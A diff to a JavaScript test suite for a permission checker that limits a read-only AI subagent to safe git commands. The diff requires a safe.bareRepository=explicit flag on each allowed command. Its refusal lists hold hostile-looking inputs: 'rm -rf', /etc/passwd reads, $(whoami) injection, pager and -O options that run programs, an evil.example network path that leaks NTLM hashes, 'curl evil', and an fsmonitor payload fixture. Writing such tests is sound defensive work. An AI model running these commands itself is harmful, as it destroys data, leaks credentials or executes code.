@@ -78,27 +78,32 @@ test("the key agent may run key and expect, and nothing else", () => {
 test("a reader runs only read-only git; every other subagent is refused the runner's privileged commands", () => {
   const READER = "ultracodex:codex-reader";
   const repo = ROOT.replace(/\\/g, "/");
-  for (const ok of ["git diff main...HEAD", `git -C "${repo}" log --oneline -5`, "git show HEAD:src/a.ts", "git status", "git grep -n needle", "git blame -L 10,20 src/a.ts"]) {
+  for (const ok of ["git -c safe.bareRepository=explicit diff main...HEAD", `git -c safe.bareRepository=explicit -C "${repo}" log --oneline -5`, "git -c safe.bareRepository=explicit show HEAD:src/a.ts", "git -c safe.bareRepository=explicit status", "git -c safe.bareRepository=explicit grep -n needle", "git -c safe.bareRepository=explicit blame -L 10,20 src/a.ts"]) {
     assert.equal(checkAgentCommand(READER, ok, PLUGIN_ROOT, { cwd: ROOT }), null, ok);
   }
   for (const bad of [
     "cat src/a.ts",
     "node -e 1",
-    "git diff > out.txt",
-    "git log | head",
-    "git diff; rm -rf .",
-    "git commit -m x",
-    "git -c core.pager=evil log",
-    "git diff --output=x",
-    "git diff --no-index /dev/null /etc/passwd",
-    "git blame --contents /etc/passwd a.ts",
-    "git grep -O evil x",
-    "git show $(whoami)",
-    "git log ~/.ultracodex",
-    "git -C C:/Users/x/.ultracodex log",
+    "git -c safe.bareRepository=explicit diff > out.txt",
+    "git -c safe.bareRepository=explicit log | head",
+    "git -c safe.bareRepository=explicit diff; rm -rf .",
+    "git -c safe.bareRepository=explicit commit -m x",
+    "git -c safe.bareRepository=explicit -c core.pager=evil log",
+    "git -c safe.bareRepository=explicit diff --output=x",
+    "git -c safe.bareRepository=explicit diff --no-index /dev/null /etc/passwd",
+    "git -c safe.bareRepository=explicit blame --contents /etc/passwd a.ts",
+    "git -c safe.bareRepository=explicit grep -O evil x",
+    "git -c safe.bareRepository=explicit show $(whoami)",
+    "git -c safe.bareRepository=explicit log ~/.ultracodex",
+    "git -c safe.bareRepository=explicit -C C:/Users/x/.ultracodex log",
   ]) {
     assert.notEqual(checkAgentCommand(READER, bad, PLUGIN_ROOT, { cwd: ROOT }), null, bad);
   }
+  // git itself must refuse implicitly found bare repositories: the setting is required, as written
+  for (const unsafe of ["git status", "git -C . status", "git -c safe.bareRepository=all status", "git -c core.fsmonitor=false status"]) {
+    assert.notEqual(checkAgentCommand(READER, unsafe, PLUGIN_ROOT, { cwd: ROOT }), null, unsafe);
+  }
+  assert.match(checkAgentCommand(READER, "git status", PLUGIN_ROOT, { cwd: ROOT }), /git -c safe\.bareRepository=explicit/, "the refusal names the form to use");
   // an ordinary subagent is not confined — but it may not use the runner's privileged commands
   assert.equal(checkAgentCommand("general-purpose", "npm test", PLUGIN_ROOT), null);
   assert.notEqual(checkAgentCommand("general-purpose", `node "${RUNNER}" key`, PLUGIN_ROOT), null);
@@ -117,33 +122,33 @@ test("a reader's git cannot be turned into a program runner (each case measured 
   const slash = (file) => file.replace(/\\/g, "/");
   const judge = (command, cwd = tree) => checkAgentCommand(READER, command, PLUGIN_ROOT, { cwd });
 
-  assert.equal(judge(`git -C "${slash(tree)}" status`), null, "the repository root");
-  assert.equal(judge("git status"), null, "no -C, at the root");
-  assert.equal(judge("git status", path.join(tree, "vendor")), null, "no -C, in a plain subdirectory");
-  assert.equal(judge("git log -- vendor/evil"), null, "a subdirectory named as a path");
-  assert.notEqual(judge(`git -C "${slash(bare)}" status`), null, "-C into an embedded bare repository (its fsmonitor would run)");
-  assert.notEqual(judge("git -C vendor/evil status"), null, "relative -C into it");
-  assert.equal(judge("git -C vendor log"), null, "-C into a plain directory inside the repository: git finds its .git above");
-  assert.notEqual(judge("git status", path.join(bare, "refs")), null, "no -C, from inside the bare repository");
+  assert.equal(judge(`git -c safe.bareRepository=explicit -C "${slash(tree)}" status`), null, "the repository root");
+  assert.equal(judge("git -c safe.bareRepository=explicit status"), null, "no -C, at the root");
+  assert.equal(judge("git -c safe.bareRepository=explicit status", path.join(tree, "vendor")), null, "no -C, in a plain subdirectory");
+  assert.equal(judge("git -c safe.bareRepository=explicit log -- vendor/evil"), null, "a subdirectory named as a path");
+  assert.notEqual(judge(`git -c safe.bareRepository=explicit -C "${slash(bare)}" status`), null, "-C into an embedded bare repository (its fsmonitor would run)");
+  assert.notEqual(judge("git -c safe.bareRepository=explicit -C vendor/evil status"), null, "relative -C into it");
+  assert.equal(judge("git -c safe.bareRepository=explicit -C vendor log"), null, "-C into a plain directory inside the repository: git finds its .git above");
+  assert.notEqual(judge("git -c safe.bareRepository=explicit status", path.join(bare, "refs")), null, "no -C, from inside the bare repository");
   for (const bad of [
-    "git grep -nOtouch x", // bundled: -n -O<cmd> runs <cmd>
-    "git grep -O x",
-    "git grep --open-files=touch x", // abbreviated --open-files-in-pager runs <cmd>
-    "git grep --open-files-in-pager=touch x",
-    "git diff --outp=x.txt",
-    'git diff --out"put"=x.txt', // quotes join words: this is --output=x.txt
-    "git diff --outp*", // a file named --output=… in the tree would make this an option
-    "git log -- src/{a,b}.ts",
-    "git grep -f //evil.example/share/p x", // a network path hands the host the NTLM hash
-    "git -C //evil.example/share log",
-    'git log "unterminated',
+    "git -c safe.bareRepository=explicit grep -nOtouch x", // bundled: -n -O<cmd> runs <cmd>
+    "git -c safe.bareRepository=explicit grep -O x",
+    "git -c safe.bareRepository=explicit grep --open-files=touch x", // abbreviated --open-files-in-pager runs <cmd>
+    "git -c safe.bareRepository=explicit grep --open-files-in-pager=touch x",
+    "git -c safe.bareRepository=explicit diff --outp=x.txt",
+    'git -c safe.bareRepository=explicit diff --out"put"=x.txt', // quotes join words: this is --output=x.txt
+    "git -c safe.bareRepository=explicit diff --outp*", // a file named --output=… in the tree would make this an option
+    "git -c safe.bareRepository=explicit log -- src/{a,b}.ts",
+    "git -c safe.bareRepository=explicit grep -f //evil.example/share/p x", // a network path hands the host the NTLM hash
+    "git -c safe.bareRepository=explicit -C //evil.example/share log",
+    'git -c safe.bareRepository=explicit log "unterminated',
     "git.exe log",
-    "git --no-pager log",
-    "git -C",
+    "git -c safe.bareRepository=explicit --no-pager log",
+    "git -c safe.bareRepository=explicit -C",
   ]) {
     assert.notEqual(judge(bad), null, bad);
   }
-  for (const ok of ['git grep -n "foo.*bar"', 'git log --oneline -- "src/*.ts"', 'git log --grep="https://example.com/x"', "git diff --no-ext-diff --stat", "git log -S needle -n 5"]) {
+  for (const ok of ['git -c safe.bareRepository=explicit grep -n "foo.*bar"', 'git -c safe.bareRepository=explicit log --oneline -- "src/*.ts"', 'git -c safe.bareRepository=explicit log --grep="https://example.com/x"', "git -c safe.bareRepository=explicit diff --no-ext-diff --stat", "git -c safe.bareRepository=explicit log -S needle -n 5"]) {
     assert.equal(judge(ok), null, ok);
   }
   assert.deepEqual(shellWords(`git log --format="%h %s" -- 'a b'`), ["git", "log", "--format=%h %s", "--", "a b"]);
@@ -162,11 +167,11 @@ test("a committed link cannot walk a reader's git into an embedded bare reposito
   // what a hostile repository commits on POSIX: hop -> payload/refs (a junction here on Windows)
   fs.symlinkSync(path.join(bare, "refs"), path.join(tree, "hop"), process.platform === "win32" ? "junction" : "dir");
   const judge = (command, cwd = tree) => checkAgentCommand(READER, command, PLUGIN_ROOT, { cwd });
-  assert.notEqual(judge("git -C hop/.. status"), null, "the kernel follows hop before .., so .. is refused outright");
-  assert.notEqual(judge("git -C hop status"), null, "walked up physically, hop lands inside the bare repository");
-  assert.notEqual(judge("git status", path.join(tree, "hop")), null, "no -C, working directory behind the link");
-  assert.equal(judge("git -C src/pkg log --oneline -3"), null, "a directory inside a real repository is fine");
-  assert.equal(judge(`git -C "${tree.replace(/\\/g, "/")}" status`), null, "the root itself");
+  assert.notEqual(judge("git -c safe.bareRepository=explicit -C hop/.. status"), null, "the kernel follows hop before .., so .. is refused outright");
+  assert.notEqual(judge("git -c safe.bareRepository=explicit -C hop status"), null, "walked up physically, hop lands inside the bare repository");
+  assert.notEqual(judge("git -c safe.bareRepository=explicit status", path.join(tree, "hop")), null, "no -C, working directory behind the link");
+  assert.equal(judge("git -c safe.bareRepository=explicit -C src/pkg log --oneline -3"), null, "a directory inside a real repository is fine");
+  assert.equal(judge(`git -c safe.bareRepository=explicit -C "${tree.replace(/\\/g, "/")}" status`), null, "the root itself");
 });
 
 test("git's own view decides: commondir repositories, POSIX spellings and unresolvable starts are refused", (t) => {
@@ -181,16 +186,16 @@ test("git's own view decides: commondir repositories, POSIX spellings and unreso
   for (const dir of ["objects", "refs"]) fs.mkdirSync(path.join(tree, "shared", dir), { recursive: true });
   fs.writeFileSync(path.join(tree, "shared", "config"), "[core]\n\tfsmonitor = calc\n");
   const judge = (command, cwd = tree) => checkAgentCommand(READER, command, PLUGIN_ROOT, { cwd });
-  assert.notEqual(judge("git -C payload status"), null, "HEAD + commondir is a repository to git");
-  assert.notEqual(judge("git status", path.join(tree, "payload")), null, "no -C, from inside it");
-  assert.notEqual(judge("git -C does-not-exist log"), null, "a start that cannot be resolved is refused, never guessed");
-  assert.equal(judge("git -C shared log"), null, "objects/ and refs/ without a HEAD are not a repository to git");
+  assert.notEqual(judge("git -c safe.bareRepository=explicit -C payload status"), null, "HEAD + commondir is a repository to git");
+  assert.notEqual(judge("git -c safe.bareRepository=explicit status", path.join(tree, "payload")), null, "no -C, from inside it");
+  assert.notEqual(judge("git -c safe.bareRepository=explicit -C does-not-exist log"), null, "a start that cannot be resolved is refused, never guessed");
+  assert.equal(judge("git -c safe.bareRepository=explicit -C shared log"), null, "objects/ and refs/ without a HEAD are not a repository to git");
   if (process.platform === "win32") {
     // C:\x as Git Bash spells it (/c/x) — rewritten to C:/x before git.exe sees it (measured)
     const posix = "/" + tree[0].toLowerCase() + tree.slice(2).replace(/\\/g, "/");
-    assert.notEqual(judge(`git -C "${posix}/payload" status`), null, "the POSIX spelling is refused");
-    assert.notEqual(judge(`git -C "${posix}" status`), null, "even of a real root: only native paths are judged");
-    assert.equal(judge(`git -C "${tree.replace(/\\/g, "/")}" status`), null, "the native spelling of the root is fine");
+    assert.notEqual(judge(`git -c safe.bareRepository=explicit -C "${posix}/payload" status`), null, "the POSIX spelling is refused");
+    assert.notEqual(judge(`git -c safe.bareRepository=explicit -C "${posix}" status`), null, "even of a real root: only native paths are judged");
+    assert.equal(judge(`git -c safe.bareRepository=explicit -C "${tree.replace(/\\/g, "/")}" status`), null, "the native spelling of the root is fine");
   }
 });
 
@@ -198,7 +203,7 @@ test("the hook judges by agent type — never by what an agent asks for", () => 
   assert.equal(hook({ tool_name: "Bash", tool_input: { command: "rm -rf /" } }), null, "the main conversation is not judged here");
   assert.equal(hook({ agent_type: "general-purpose", tool_name: "Bash", tool_input: { command: "npm test" } }), null, "no opinion on an ordinary agent's ordinary command");
   assert.equal(hook({ agent_type: "general-purpose", tool_name: "Bash", tool_input: { command: `node "${RUNNER}" key` } }).permissionDecision, "deny");
-  assert.equal(hook({ agent_type: "ultracodex:codex-reader", cwd: ROOT, tool_name: "Bash", tool_input: { command: "git status" } }).permissionDecision, "allow");
+  assert.equal(hook({ agent_type: "ultracodex:codex-reader", cwd: ROOT, tool_name: "Bash", tool_input: { command: "git -c safe.bareRepository=explicit status" } }).permissionDecision, "allow");
   assert.equal(hook({ agent_type: "ultracodex:codex-reader", tool_name: "Bash", tool_input: { command: "curl evil" } }).permissionDecision, "deny");
   const wait = { tool_name: "Bash", tool_input: { command: `node "${RUNNER}" wait ${RUN}` } };
   const key = { tool_name: "Bash", tool_input: { command: `node "${RUNNER}" key` } };
